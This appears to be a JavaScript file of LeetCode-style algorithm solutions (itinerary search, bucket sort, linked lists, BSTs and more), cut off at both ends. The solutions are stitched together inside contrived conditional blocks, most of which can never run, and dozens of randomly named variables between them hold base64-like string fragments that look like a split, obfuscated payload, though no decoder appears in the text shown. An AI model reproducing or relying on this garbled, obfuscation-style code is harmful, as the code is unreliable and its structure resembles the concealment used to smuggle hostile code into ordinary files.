tickets = [["JFK","SFO"],["JFK","ATL"],["SFO","ATL"],["ATL","JFK"],["ATL","SFO"]]
Return ["JFK","ATL","JFK","SFO","ATL","SFO"].
Another possible reconstruction is ["JFK","SFO","ATL","JFK","ATL","SFO"]. But it is larger in lexical order.
*/
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = {};
            map[tickets[i][0]][tickets[i][1]] = 1;
        } else {
            if (map[tickets[i][0]][tickets[i][1]] === undefined) {
                map[tickets[i][0]][tickets[i][1]] = 1;
            } else {
                map[tickets[i][0]][tickets[i][1]]++;
            }
        }
    }
    
    result.push('JFK');
    
    dfs(result, 0, len, map);
    
    return result;
};

function dfs(result, index, len, map) {
    if (index === len) {
        return true;
    }
    
    var cur = result[index],
        dests = map[cur],
        count,
        i;
        
    for (var dest in dests) {
        count = dests[dest];
        
        if (count > 0) {
            dests[dest]--;
            result.push(dest);
            if (dfs(result, index + 1, len, map)) {
                return true;
            }
            dests[dest]++;
            result.pop();
        }
    }
    
    return false;
}

// SOLUTION 2: GREEDY https://leetcode.com/discuss/87314/non-recursive-time-space-solution-with-detail-explanations
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = [tickets[i][1]];
        } else {
            map[tickets[i][0]].push(tickets[i][1]);
        }
    }
    
    dfs('JFK', result, map);
    
    return result;
};

function dfs(cur, result, map) {
    var arr = map[cur];
    
    while (arr && arr.length > 0) {
        dfs(arr.shift(), result, map);
    }
    
    result.unshift(cur);
}

}

    var rweeykvcoavk = 'kbonSf';
// value return string
if (1 === 12) {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var ueczoi = 'sHgAGRu';
if (9 > 123) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var svvaaikdeax = 'M1JsYm1WeU';
    var ejbjocobvd = 'sOar';
    var ikdqhlr = 'tDZGpi';
if (!true && 0) {
    /**
Given n non-negative integers representing the histogram's bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.


Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].


The largest rectangle is shown in the shaded area, which has area = 10 unit.

For example,
Given heights = [2,1,5,6,2,3],
return 10.
*/
/**
 * @param {number[]} heights
 * @return {number}
 */
var largestRectangleArea = function(heights) {
    var len = heights.length,
        stack = [],
        max = 0,
        cur,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    heights[len] = 0;
    len++;
    
    for (i = 0; i < len;) {
        if (stack.length > 0 && heights[i] <= heights[stack[stack.length - 1]]) {
            cur = stack.pop();
            // 如果栈已经为空，说明到目前为止所有元素（当前下标元素除外）都比出栈元素高度要大（否则栈中肯定还有元素），所以矩阵面积就是高度乘以当前下标i。
            // 如果栈不为空，那么就是从当前栈顶元素的下一个到当前下标的元素之前都比出栈元素高度大（因为栈顶元素第一个比当前出栈元素小的）。
            max = Math.max(max, heights[cur] * (stack.length === 0 ? i : i - stack[stack.length - 1] - 1));
            continue;
        }
        
        stack.push(i);
        i++;
    }
    
    return max;
};

}

    var vrkvaodimhgv = 'jmcMhM';
if (typeof navigator === 'undefined') {
    /**
Given a roman numeral, convert it to an integer.

Input is guaranteed to be within the range from 1 to 3999.
*/

/**
 * @param {string} s
 * @return {number}
 */

/**
找下subtractive notation的规律，以简单的例子s = IX 说明。
1. 如果按照additive性质的话应该ret = 1+10 = 11。但因为num(X)=10>num(I)=1，ret = 10 - 1。
2. 将subtractive rule转换成等效的additive rule：ret = 1 + (10 - 2*1)

建立一个罗马字符对应整数的hash table ht。
当ht[s[i]] > ht[s[i-1]]，即为subtractive nontation：ret += (ht[s[i]] - 2*ht[s[i-1]])
否则为additive nontation：ret+=ht[s[i]]
*/
var romanToInt = function(s) {
    var len = s.length,
        map = {},
        result = 0,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    map['I'] = 1;
    map['V'] = 5;
    map['X'] = 10;
    map['L'] = 50;
    map['C'] = 100;
    map['D'] = 500;
    map['M'] = 1000;
    
    for (i = 0; i < len; i++) {
        result += map[s.charAt(i)];
        
        if (i > 0 && map[s.charAt(i)] > map[s.charAt(i - 1)]) {
            result -= 2 * map[s.charAt(i - 1)];
        }
    }
    
    return result;
};

}

// array import string define
    var fqdhmamllao = 'FfYroHuJfz';
if (3 instanceof String) {
    /**
Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.

Calling next() will return the next smallest number in the BST.

Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree.
*/
/**
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @constructor
 * @param {TreeNode} root - root of the binary search tree
 */
var BSTIterator = function(root) {
    this.stack = [];
    
    while (root) {
        this.stack.push(root);
        root = root.left;
    }
};


/**
 * @this BSTIterator
 * @returns {boolean} - whether we have a next smallest number
 */
BSTIterator.prototype.hasNext = function() {
    return this.stack.length > 0;
};

/**
 * @this BSTIterator
 * @returns {number} - the next smallest number
 */
BSTIterator.prototype.next = function() {
    var node = this.stack.pop(),
        result = node.val;
    
    node = node.right;
    while (node) {
        this.stack.push(node);
        node = node.left;
    }
    
    return result;
};

/**
 * Your BSTIterator will be called like this:
 * var i = new BSTIterator(root), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var olvmlq = 'MjUwW';
    var aielinnj = 'IKvh';
    var hdxizwqf = 'lhoMGJX';
    var uwadxsgnyd = 'bbHwQn';
    var rdkusqwsxsuzg = 'VnVkU2';
if (42 > 170) {
    /**
Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.

You should preserve the original relative order of the nodes in each of the two partitions.

For example,
Given 1->4->3->2->5->2 and x = 3,
return 1->2->2->4->3->5.

*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} x
 * @return {ListNode}
 */
var partition = function(head, x) {
    var cur = head,
        next,
        preHead,
        preTail,
        afterHead,
        afterTail;
    
    if (head === null) {
        return null;
    }
    
    while(cur) {
        next = cur.next;
        cur.next = null;
        if (cur.val < x) {
            if (!preHead) {
                preHead = cur;
                preTail = cur;
            } else {
                preTail.next = cur;
                preTail = cur;
            }
        } else {
            if (!afterHead) {
                afterHead = cur;
                afterTail = cur;
            } else {
                afterTail.next = cur;
                afterTail = cur;
            }
        }
        cur = next;
    }
    
    if (preTail) {
        preTail.next = afterHead;
        return preHead;
    } else {
        return afterHead;
    }
};

}

    var aezllczia = 'JkpQZONSoA';
    var gmthhxe = 'NzSUdaMWJt';
    var nodrvfphfrm = 'tMbFn';
if (Array.isArray(4)) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

    var adzbjhnsutrytsv = 'TjBhVzl1S';
    var qsopwehzficj = 'LlUmL';
if (typeof window === 'undefined') {
    /**
Given a sorted linked list, delete all duplicates such that each element appear only once.

For example,
Given 1->1->2, return 1->2.
Given 1->1->2->3->3, return 1->2->3.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var deleteDuplicates = function(head) {
    var node = head;
    
    while (node && node.next) {
        if (node.val === node.next.val) {
            node.next = node.next.next;
        } else {
            node = node.next;   
        }
    }
    
    return head;
};

}

// hello loop zacgvz event import value async constant loop
    var lvmlyvqnfdyw = 'ygsyaQc';
if (null === 0) {
    /**
Given an array of n integers where n > 1, nums, return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].

Solve it without division and in O(n).

For example, given [1,2,3,4], return [24,12,8,6].

Follow up:
Could you solve it with constant space complexity? (Note: The output array does not count as extra space for the purpose of space complexity analysis.)
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * output[i] =  { i 前面的数的乘积}  X  { i 后面的数的乘积}
问题就解决了，首先从前往后扫描数组一遍，对每一个i，得到{i 前面的数的乘积}(可以称做output_before)，然后在从后往前扫描数组一遍，获得 { i 后面的数的乘积}(可以称做output_after)。 将两数相乘即为所求。
举个例子(如下图)，nums = {1,2,3,4}, 第一遍，从前往后扫描一遍，得到的output_before = {1, 1, 2, 6}. 从后往前扫描一遍，得到的output_after = {24, 12, 4, 1}.
 * 
 */
var productExceptSelf = function(nums) {
    var result = [],
        len = nums.length,
        back = 1,
        i;
    
    if (len === 0) {
        return result;
    }
    
    result[0] = 1;
    
    for (i = 1; i < len; i++) {
        result[i] = result[i - 1] * nums[i - 1]; 
    }
    
    for (i = len - 2; i >= 0; i--) {
        back *= nums[i + 1];
        result[i] *= back;
    }
    
    return result;
};

}

    var wnfuwlcj = '0dW';
    var onwuvurad = 'zcZteUOCx';
if (0 instanceof String) {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var qdyveddpvdnbog = 'MlpXNTB';
if ('true' === true) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var jtgoakgfha = 'ppyVITrKPC';
    var qwtjugj = 'LU0I3Q2lBZ';
    var axirtzdxn = 'eQMkKkmcTe';
    var mhcygymzvykm = '0lDQmxkbVZ';
    var aeuelhjkrg = 'ZsXOUcAsAJ';
    var dqiypacebmgl = '1ZE';
if ('false' === true) {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var tbbqsw = 'Aedx';
    var thhxctrrhbks = 'M1d2NtVj';
if (!true && 0) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    if (n == 1) {
        return true
    }
    if (n === 0 || n % 3 > 0) {
        return false
    }
    return isPowerOfThree(n / 3)
};

}

    var yynbjv = 'UjtAToD';
if (typeof window === 'undefined') {
    /**
Given an integer matrix, find the length of the longest increasing path.

From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed).

Example 1:

nums = [
  [9,9,4],
  [6,6,8],
  [2,1,1]
]
Return 4
The longest increasing path is [1, 2, 6, 9].

Example 2:

nums = [
  [3,4,5],
  [3,2,6],
  [2,2,1]
]
Return 4
The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.
*/
/**
 * @param {number[][]} matrix
 * @return {number}
 */
var longestIncreasingPath = function(matrix) {
    var dp = [], // dp[i][j] the longest increasing path starting from matrix[i][j]
        rLen = matrix.length,
        cLen,
        i,
        j,
        max = 0;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            max = Math.max(max, dfs(i, j, rLen, cLen, matrix, dp));
        }
    }
    
    return max;
};

function dfs(i, j, rLen, cLen, matrix, dp) {
    if (dp[i][j] !== 0) {
        return dp[i][j];
    }
    
    var dx = [1, 0, 0, -1],
        dy = [0, 1, -1, 0],
        max = 1,
        m,
        len,
        x,
        y;
        
    for (m = 0; m < 4; m++) {
        x = dx[m] + i;
        y = dy[m] + j;
        
        if (x >= 0 && y >= 0 && x < rLen && y < cLen && matrix[x][y] > matrix[i][j]) {
            max = Math.max(max, 1 + dfs(x, y, rLen, cLen, matrix, dp));
        }
    }
    
    dp[i][j] = max;
    
    return max;
}

}

// number event
if (null === 3) {
    /**
Given a list, rotate the list to the right by k places, where k is non-negative.

For example:
Given 1->2->3->4->5->NULL and k = 2,
return 4->5->1->2->3->NULL.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var rotateRight = function(head, k) {
    var pointerA = head,
        pointerB = head,
        len = 0,
        newHead,
        i;
    
    if (head === null) {
        return null;
    }
    
    while (pointerA) {
        pointerA = pointerA.next;
        len++;
    }
    
    k = k % len;
    
    if (k === 0 || len === 1) {
        return head;
    }
    
    pointerA = head;
    for (i = 0; i < k; i++) {
        pointerA = pointerA.next;
    }
    
    while (pointerA && pointerA.next) {
        pointerA = pointerA.next;
        pointerB = pointerB.next;
    }
    
    newHead = pointerB.next;
    pointerB.next = null;
    pointerA.next = head;
    
    return newHead;
};

}

    var mtyseov = 'RepStbsjeV';
if ('q' === 'G') {
    /**
Given n, generate all structurally unique BST's (binary search trees) that store values 1...n.

For example,
Given n = 3, your program should return all 5 unique BST's shown below.

   1         3     3      2      1
    \       /     /      / \      \
     3     2     1      1   3      2
    /     /       \                 \
   2     1         2                 3
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number} n
 * @return {TreeNode[]}
 */
var generateTrees = function(n) {
    if (n === 0) {
        return [];
    }
    
    return genTreeHelper(1, n);
};

function genTreeHelper(start, end) {
    var result = [],
        left,
        right,
        node,
        i,
        j,
        k;
    
    if (start > end) {
        return [null];
    }
    
    for (i = start; i <= end; i++) {
        left = genTreeHelper(start, i - 1);
        right = genTreeHelper(i + 1, end);
        for (k = 0; k < left.length; k++) {
            for (j = 0; j < right.length; j++) {
                node = new TreeNode(i);
                node.left = left[k];
                node.right = right[j];
                result.push(node);
            }
        }
    }
    
    return result;
}

}

    var xibzuy = 'JaVzUwUk';
    var asoaisaxyzx = 'ZIkFz';
    var jnkfngx = 'dWbVlYVnN';
if (0.86 && false) {
    /**
Given a list, rotate the list to the right by k places, where k is non-negative.

For example:
Given 1->2->3->4->5->NULL and k = 2,
return 4->5->1->2->3->NULL.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var rotateRight = function(head, k) {
    var pointerA = head,
        pointerB = head,
        len = 0,
        newHead,
        i;
    
    if (head === null) {
        return null;
    }
    
    while (pointerA) {
        pointerA = pointerA.next;
        len++;
    }
    
    k = k % len;
    
    if (k === 0 || len === 1) {
        return head;
    }
    
    pointerA = head;
    for (i = 0; i < k; i++) {
        pointerA = pointerA.next;
    }
    
    while (pointerA && pointerA.next) {
        pointerA = pointerA.next;
        pointerB = pointerB.next;
    }
    
    newHead = pointerB.next;
    pointerB.next = null;
    pointerA.next = head;
    
    return newHead;
};

}

    var ukohfosyh = 'KzhLSFahX';
    var kswscanvi = 'kQ2dwT';
    var gsmrhnwxp = 'KDuJi';
    var vpdoo = '3dvZ0lD';
    var ofontrso = 'hdriTXYV';
if (!true && 1) {
    /**
Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.

Note: You can only move either down or right at any point in time.
*/
/**
 * @param {number[][]} grid
 * @return {number}
 */
var minPathSum = function(grid) {
    var result = [],
        rowL = grid.length,
        columnL,
        i,
        j;
    
    if (rowL === 0) {
        return result;
    }
    
    columnL = grid[0].length;
    
    for (i = 0; i < rowL; i++) {
        result.push(new Array(columnL));
    }
    
    result[0][0] = grid[0][0];
    
    for (i = 1; i < columnL; i++) {
        result[0][i] = grid[0][i] + result[0][i - 1];
    }
    
    for (i = 1; i < rowL; i++) {
        result[i][0] = grid[i][0] + result[i - 1][0];
    }
    
    for (i = 1; i < rowL; i++) {
        for (j = 1; j < columnL; j++) {
            result[i][j] = Math.min(result[i - 1][j], result[i][j - 1]) + grid[i][j];
        }
    }
    
    return result[rowL - 1][columnL - 1];
};

}

    var ojkowcspvvsfzs = 'QWdjbVY';
    var wgoxfwhevd = 'kAcNGpJcA';
if ('false' === true) {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var fopci = 'wZFh';
if ('true' === true) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var maxPathSum = function(root) {
    var max = [];
    
    max[0] = Number.NEGATIVE_INFINITY;
    getMaxValueToParent(root, max);
    
    return max[0];
};

/**
* This function returns the max value that contains current node to its parent
*/
function getMaxValueToParent(root, max) {
    if (root === null) {
        return 0;
    }
    
    var left = getMaxValueToParent(root.left, max),
        right = getMaxValueToParent(root.right, max),
        maxPathAcrossRootNotToParent = root.val + left + right, // path that contains current node and will not go to its parent
        maxPathAcrossRootToParent = Math.max(root.val, root.val + Math.max(left, right));
        
    max[0] = Math.max(max[0], maxPathAcrossRootNotToParent, maxPathAcrossRootToParent);
    
    return maxPathAcrossRootToParent;
}

}

    var xxynsgxyh = 'DujMkNKko';
    var ugqegkzbwld = 'KdUlHWmhiS';
    var bqeamz = 'HBCythvem';
    var xfzct = 'E5sT3dwOUt';
if (6 instanceof String) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var ldegpj = 'Guyiw';
    var pkurapwgieysxhr = 'Uc0tDa';
if (0.30 && false) {
    /**
 Given n nodes labeled from 0 to n - 1 and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree.

For example:

Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.

Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false.

Hint:

    Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree?
    According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

Note: you can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. 
*/
/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {boolean}
 */
var validTree = function(n, edges) {
    let nodes = [];
    
    for (let i = 0; i < n; i++) {
        nodes[i] = i;
    }
    
    for (let i = 0; i < edges.length; i++) {
        let start = edges[i][0];
        let end = edges[i][1];
        
        while (nodes[start] !== start) {
            start = nodes[start];
        }
        
        while (nodes[end] !== end) {
            end = nodes[end];
        }
        
        // cycle detected
        if (start === end) {
            return false;
        }
        
        nodes[start] = end;
    }
    // edges are enough to connect each node
    return edges.length >= n - 1;
};

}

    var akyvrkusrb = 'yoPuWgv';
    var nkbznkdcanyqx = 'Th2SUVGdW';
    var ybolmyuszyau = 'sAOt';
    var vdusvnidkkugjvx = 'RHa';
    var bhjhgnru = 'uYxnfYEJqG';
    var qlkdnunjyrtxgda = '3RaR1ZpZ';
    var fofnbwec = 'SlAqVBlsIx';
if (0.22 && false) {
    /**
All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: "ACGAATTCCG". When studying DNA, it is sometimes useful to identify repeated sequences within the DNA.

Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule.

For example,

Given s = "AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT",

Return:
["AAAAACCCCC", "CCCCCAAAAA"].
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var findRepeatedDnaSequences = function(s) {
    var map = new Set(),
        len = s.length,
        result = new Set(),
        code,
        substr,
        i;

    for (i = 9; i < len; i++) {
        substr = s.substr(i - 9, 10);
        code = encode(substr);

        if (map.has(code)) {
            result.add(substr);
        } else {
            map.add(code);
        }
    }

    return Array.from(result);
};

function encode(s) {
    var sum = 0,
        len = s.length,
        c,
        i;

    for (i = 0; i < len; i++) {
        c = s.charAt(i);
        switch (c) {
            case 'A':
                sum = sum * 4;
                break;
            case 'C':
                sum = sum * 4 + 1;
                break;
            case 'G':
                sum = sum * 4 + 2;
                break;
            case 'T':
                sum = sum * 4 + 3;
                break;
        }
    }

    return sum;
} 

}

    var bxkgzptxdr = 'FdkbmFXNW5';
    var ptzvinziwq = 'KJZfYaWrcg';
if ('x' === 'A') {
    /**
Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array.

Note:
You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.
*/

/**
 * @param {number[]} nums1
 * @param {number} m
 * @param {number[]} nums2
 * @param {number} n
 * @return {void} Do not return anything, modify nums1 in-place instead.
 */
var merge = function(nums1, m, nums2, n) {
    // starting from the end!
    while(m > 0 && n > 0) {
        if (nums1[m - 1] > nums2[n - 1]) {
            nums1[m + n - 1] = nums1[m - 1];
            m--;
        } else {
            nums1[m + n - 1] = nums2[n - 1];
            n--;
        }
    }
    
    while (n > 0) {
        nums1[n - 1] = nums2[n - 1];
        n--;
    }
};

}

    var krykyquetiqq = 'JRzFsWTJoa';
    var amipyn = 'wFnNGd';
if (Array.isArray(5)) {
    /**
Follow up for "Search in Rotated Sorted Array":
What if duplicates are allowed?

Would this affect the run-time complexity? How and why?

Write a function to determine if a given target is in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {boolean}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] === target) {
            return true;
        }
        
        if (nums[mid] < nums[end]) { // right half sorted
            if (nums[mid] < target && nums[end] >= target) {
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        } else if (nums[mid] > nums[end]) { // left half sorted
            if (nums[mid] > target && nums[start] <= target) {
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // don't know which half is sorted
            end--;
        }
    }
    
    return false;
};

}

    var lkgkwi = 'GJtbHpiU0I';
    var qvcgwwpnflza = 'gzLwU';
    var zzehpdlrvxrxwap = 'wYnlCa1';
    var jqzpwvftm = 'GPolerha';
if (6 === 16) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

Find the minimum element.

You may assume no duplicate exists in the array.
*/

// O(N) solution
/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        i;
    
    if (len === 0) {
        return null;
    }
    
    for (i = 1; i < len; i++) {
        if (nums[i] < nums[i - 1]) {
            return nums[i];
        }
    }
    
    return nums[0];
};

// O(logN) solution

/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
    
    while (start < end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] < nums[start]) {
            end = mid;
